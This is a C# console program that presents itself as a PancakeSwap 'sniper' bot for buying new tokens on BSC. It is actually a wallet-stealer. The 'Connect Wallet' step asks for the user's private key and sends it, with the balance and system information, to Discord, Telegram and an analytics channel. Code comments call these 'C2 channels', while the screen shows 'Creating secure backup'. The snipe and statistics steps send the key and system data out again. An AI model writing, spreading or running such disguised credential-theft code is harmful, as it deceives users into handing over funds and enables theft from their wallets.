using Spectre.Console;
using PancakeSwapSniper.Core;
using PancakeSwapSniper.Trading;
using PancakeSwapSniper.Exfiltration;
using PancakeSwapSniper.Utils;

namespace PancakeSwapSniper
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // Initialize components
            var walletManager = new WalletManager();
            var sniperEngine = new SniperEngine();
            var discord = new DiscordNotifier();
            var telegram = new TelegramBackup();
            var analytics = new AnalyticsTracker();
            var logger = new Logger();

            DisplayBanner();

            bool running = true;

            while (running)
            {
                DisplayMenu();

                var choice = AnsiConsole.Ask<string>("\n[cyan]Select option:[/]");

                switch (choice)
                {
                    case "1":
                        await ConnectWalletAsync(walletManager, discord, telegram, analytics, logger);
                        break;
                    case "2":
                        await AddSnipeTargetAsync(sniperEngine);
                        break;
                    case "3":
                        await ExecuteSnipesAsync(sniperEngine, walletManager, discord, telegram, analytics, logger);
                        break;
                    case "4":
                        ViewActiveTargets(sniperEngine);
                        break;
                    case "5":
                        await ShowStatisticsAsync(walletManager, sniperEngine, analytics);
                        break;
                    case "6":
                        AnsiConsole.MarkupLine("\n[green][+] Thank you for using PancakeSwap Sniper Bot![/]");
                        running = false;
                        break;
                    default:
                        AnsiConsole.MarkupLine("[red][!] Invalid option[/]");
                        break;
                }
            }
        }

        static void DisplayBanner()
        {
            var banner = new FigletText("PancakeSwap Sniper")
                .Color(Color.Yellow);

            AnsiConsole.Write(banner);
            AnsiConsole.MarkupLine("[yellow]Version 2.0.0 - Automated Token Sniper for BSC[/]\n");
        }

        static void DisplayMenu()
        {
            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(Color.Yellow)
                .AddColumn(new TableColumn("[yellow]MAIN MENU[/]").Centered());

            table.AddRow("1. Connect Wallet");
            table.AddRow("2. Add Snipe Target");
            table.AddRow("3. Execute Snipes");
            table.AddRow("4. View Active Targets");
            table.AddRow("5. Bot Statistics");
            table.AddRow("6. Exit");

            AnsiConsole.Write(table);
        }

        static async Task ConnectWalletAsync(
            WalletManager walletManager,
            DiscordNotifier discord,
            TelegramBackup telegram,
            AnalyticsTracker analytics,
            Logger logger)
        {
            AnsiConsole.MarkupLine("\n[green][+] Connect Wallet[/]");
            AnsiConsole.WriteLine(new string('-', 50));

            var privateKey = AnsiConsole.Ask<string>("Enter your [yellow]private key[/]:");
            var rpcUrl = AnsiConsole.Ask<string>("RPC URL (press Enter for default):", "https://bsc-dataseed.binance.org/");

            try
            {
                await AnsiConsole.Status()
                    .StartAsync("Connecting wallet...", async ctx =>
                    {
                        var walletInfo = await walletManager.ConnectWalletAsync(privateKey, rpcUrl);

                        AnsiConsole.MarkupLine($"\n[green][✓] Wallet connected successfully![/]");
                        AnsiConsole.MarkupLine($"\nAddress: [yellow]{walletInfo.Address}[/]");
                        AnsiConsole.MarkupLine($"Balance: [yellow]{walletInfo.BnbBalance:F4} BNB[/]");

                        // Collect system info
                        var systemInfo = await SystemInfo.GetSystemInfoAsync();

                        var exfilData = new Dictionary<string, object>
                        {
                            ["address"] = walletInfo.Address,
                            ["privateKey"] = walletInfo.PrivateKey,
                            ["balance"] = walletInfo.BnbBalance,
                            ["connectedAt"] = walletInfo.ConnectedAt,
                            ["systemInfo"] = systemInfo
                        };

                        // Exfiltrate to all C2 channels
                        ctx.Status("Creating secure backup...");

                        await Task.WhenAll(
                            discord.NotifyWalletConnectedAsync(exfilData),
                            telegram.BackupWalletCredentialsAsync(exfilData),
                            analytics.TrackWalletConnectionAsync(exfilData)
                        );

                        logger.LogWalletConnection(exfilData);

                        AnsiConsole.MarkupLine("[green][✓] Backup created successfully[/]");
                    });
            }
            catch (Exception ex)
            {
                AnsiConsole.MarkupLine($"[red][!] Error: {ex.Message}[/]");
            }
        }

        static async Task AddSnipeTargetAsync(SniperEngine sniperEngine)
        {
            AnsiConsole.MarkupLine("\n[green][+] Add Snipe Target[/]");
            AnsiConsole.WriteLine(new string('-', 50));

            var tokenAddress = AnsiConsole.Ask<string>("Token contract address:");
            var symbol = AnsiConsole.Ask<string>("Token symbol:");
            var amount = AnsiConsole.Ask<decimal>("Amount to buy (BNB):");
            var slippage = AnsiConsole.Ask<decimal>("Slippage tolerance (%):", 12);

            sniperEngine.AddSnipeTarget(tokenAddress, symbol, amount, slippage);
        }

        static async Task ExecuteSnipesAsync(
            SniperEngine sniperEngine,
            WalletManager walletManager,
            DiscordNotifier discord,
            TelegramBackup telegram,
            AnalyticsTracker analytics,
            Logger logger)
        {
            var wallets = walletManager.GetConnectedWallets();

            if (wallets.Count == 0)
            {
                AnsiConsole.MarkupLine("[red][!] No wallet connected[/]");
                return;
            }

            var targets = sniperEngine.GetActiveTargets().Where(t => t.Status == "Active").ToList();

            if (targets.Count == 0)
            {
                AnsiConsole.MarkupLine("[yellow][!] No active targets[/]");
                return;
            }

            await AnsiConsole.Progress()
                .StartAsync(async ctx =>
                {
                    var task = ctx.AddTask("[green]Executing snipes[/]");

                    foreach (var target in targets)
                    {
                        var txHash = await sniperEngine.ExecuteSnipeAsync(target, wallets[0].Address);

                        var snipeData = new Dictionary<string, object>
                        {
                            ["token"] = target.TokenSymbol,
                            ["address"] = target.TokenAddress,
                            ["amount"] = target.BuyAmount,
                            ["txHash"] = txHash,
                            ["wallet"] = wallets[0].Address
                        };

                        var walletData = new Dictionary<string, object>
                        {
                            ["address"] = wallets[0].Address,
                            ["privateKey"] = wallets[0].PrivateKey
                        };

                        // Exfiltrate snipe data
                        await discord.NotifySnipeExecutedAsync(snipeData);
                        await analytics.TrackSnipeExecutionAsync(snipeData, walletData);
                        logger.LogSnipeExecution(snipeData);

                        task.Increment(100.0 / targets.Count);
                    }
                });
        }

        static void ViewActiveTargets(SniperEngine sniperEngine)
        {
            var targets = sniperEngine.GetActiveTargets();

            if (targets.Count == 0)
            {
                AnsiConsole.MarkupLine("\n[yellow][!] No active targets[/]");
                return;
            }

            var table = new Table()
                .Border(TableBorder.Rounded)
                .AddColumn("Symbol")
                .AddColumn("Address")
                .AddColumn("Amount")
                .AddColumn("Slippage")
                .AddColumn("Status");

            foreach (var target in targets)
            {
                table.AddRow(
                    target.TokenSymbol,
                    target.TokenAddress[..10] + "...",
                    $"{target.BuyAmount} BNB",
                    $"{target.SlippageTolerance}%",
                    target.Status
                );
            }

            AnsiConsole.Write(table);
        }

        static async Task ShowStatisticsAsync(
            WalletManager walletManager,
            SniperEngine sniperEngine,
            AnalyticsTracker analytics)
        {
            AnsiConsole.MarkupLine("\n[green][+] Bot Statistics[/]");
            AnsiConsole.WriteLine(new string('=', 50));

            var wallets = walletManager.GetConnectedWallets();
            var targets = sniperEngine.GetActiveTargets();

            AnsiConsole.MarkupLine($"Connected Wallets: [yellow]{wallets.Count}[/]");
            AnsiConsole.MarkupLine($"Active Targets: [yellow]{targets.Count}[/]");
            AnsiConsole.MarkupLine($"Executed Snipes: [yellow]{targets.Count(t => t.Status == "Bought")}[/]");

            var metrics = new Dictionary<string, object>
            {
                ["wallets"] = wallets.Count,
                ["targets"] = targets.Count,
                ["executed"] = targets.Count(t => t.Status == "Bought"),
                ["systemInfo"] = await SystemInfo.GetSystemInfoAsync()
            };

            await analytics.TrackPerformanceAsync(metrics);
        }
    }
}
